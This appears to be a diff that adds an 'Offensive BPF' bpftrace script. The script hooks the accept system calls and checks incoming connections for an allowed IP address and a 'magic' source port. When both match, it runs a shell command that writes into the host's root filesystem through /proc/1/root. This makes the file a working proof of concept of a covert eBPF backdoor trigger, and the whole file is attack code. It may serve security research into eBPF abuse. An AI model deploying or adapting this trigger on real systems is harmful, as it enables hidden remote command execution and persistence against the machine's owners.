@@ -1,0 +1,48 @@
+#include <net/sock.h>
+
+BEGIN
+{
+    printf("Welcome to Offensive BPF... Use Ctrl-C to exit.\n");
+    printf("Allowed IP: %u (=> %s). Magic Port: %u\n", $1, ntop(AF_INET, $1), $2);
+}
+
+tracepoint:syscalls:sys_enter_accept* 
+{ 
+  @sk[tid] = args->upeer_sockaddr;
+}
+
+tracepoint:syscalls:sys_exit_accept*
+/ @sk[tid] /
+{
+  $sk = (struct sockaddr_in *) @sk[tid]; 
+
+  if ($sk->sin_family == AF_INET) 
+  {
+    $src_port_tmp = (uint16) $sk->sin_port;
+    $src_addr     = $sk->sin_addr.s_addr;
+    $src_port     = (( $src_port_tmp  >> 8) |  (( $src_port_tmp << 8) & 0x00FF00));
+
+    printf("->sys_exit_accept*: Process: %s. Remote IP: %s (%d). Port: %u\n", 
+              comm,  
+              ntop(AF_INET, $sk->sin_addr.s_addr),
+              $sk->sin_addr.s_addr,
+              $src_port);
+
+    if (($sk->sin_addr.s_addr == (uint32)$1) &&  ($src_port == (uint16) $2))
+    {
+        printf("->sys_exit_accept*: IP and magic port check passed.\n");  
+        system("whoami >> /proc/1/root/tmp/o");
+        printf("->sys_exit_accept*: Command executed.\n");
+    }
+    else
+    { 
+          printf("->sys_exit_accept*: IP/Magic port check FAILED.\n"); 
+    } 
+  }   
+}
+
+END
+{
+    clear(@sk);
+    printf("Exiting. Bye.\n");
+}
